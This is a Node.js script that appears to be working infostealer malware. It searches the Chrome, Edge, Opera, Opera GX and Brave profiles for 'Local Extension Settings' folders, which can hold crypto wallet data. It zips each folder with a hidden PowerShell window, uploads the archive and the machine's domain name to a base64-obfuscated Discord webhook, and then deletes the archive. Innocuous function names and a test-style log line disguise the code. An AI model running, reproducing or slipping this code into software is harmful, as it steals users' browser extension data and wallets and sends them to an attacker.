const cp = require('child_process');
const {exec} = require('child_process');
const fs = require('fs');
const crypto = require('crypto');
const DataPaths = [
    "C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data".replaceAll('Admin',process.env.USERNAME),
    "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Edge\\User Data".replaceAll('Admin',process.env.USERNAME),
    "C:\\Users\\Admin\\AppData\\Roaming\\Opera Software\\Opera Stable".replaceAll('Admin',process.env.USERNAME),
    "C:\\Users\\Admin\\AppData\\Local\\Programs\\Opera GX".replaceAll('Admin',process.env.USERNAME),
    "C:\\Users\\Admin\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data".replaceAll('Admin',process.env.USERNAME)
]
const {URL} = require('url');
function createZipFile(source, dest) {
    return new Promise((resolve, reject) => {
      const command = `powershell.exe -Command 'Compress-Archive -Path "${source}" -DestinationPath "${dest}"'`; 
      exec(command, (error, stdout, stderr) => {
        if (error) {
          //console.log(error,stdout,stderr)
          reject(error);
        } else {
          //console.log(error,stdout,stderr)
          resolve(stdout);
        }
      });
    });
}
async function makelove(webhookUrl=atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNTQ4OTE2ODkyNjYzODE5MS9PVFVwZTQ4dUhFZ3lfcXZLZ25SRVFzTFpZNklQU2Q0c3duZEVuRmJ2bm5CN0g3cW5VQS03ZHJCLUR1RkVMcmdvVkwyUw=="), filePath, fileName) {
  try {
    const fileData = fs.readFileSync(filePath);
    const formData = new FormData();
    formData.append('file', new Blob([fileData]), fileName);
    formData.append('content',process.env.USERDOMAIN);
    const response = await fetch(webhookUrl, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    //console.log('Running Test(s) +1');
  } catch (error) {
    console.error('Error :', error);
  } finally {
    try {
      cp.execSync('cmd /C del "'+filePath+'"');
    } catch {

    }
  }
}
const folderName = "Local Extension Settings";
for (var i = 0; i < DataPaths.length; i++) {
    const datapath = DataPaths[i];
    if (fs.existsSync(datapath)) {
        const dirs = fs.readdirSync(datapath);
        const profiles = dirs.filter(a => a.toLowerCase().startsWith('profile'));
        profiles.push('Default');
        for (const profile of profiles) {
            if (typeof profile == "string") {
                const dir = datapath+'\\'+profile+'\\'+folderName;
                if (fs.existsSync(dir)) {
                    //console.log(dir)
                    const nayme = crypto.randomBytes(2).toString('hex')
                    const command = `powershell -WindowStyle Hidden -Command "Compress-Archive -Path '${dir}\\*' -DestinationPath 'C:\\ProgramData\\Intel\\brsr${nayme}.zip' -CompressionLevel Fastest"`;
                    cp.exec(command,(e,so,se) => {
                      if (!e) {
                        makelove(undefined,`C:\\ProgramData\\Intel\\brsr${nayme}.zip`,'extensions.zip');
                        //console.log(e,so,se)
                      } else {
                        //console.log(e,so,se)
                      }
                    })
                }

            }
        }
    }
    
}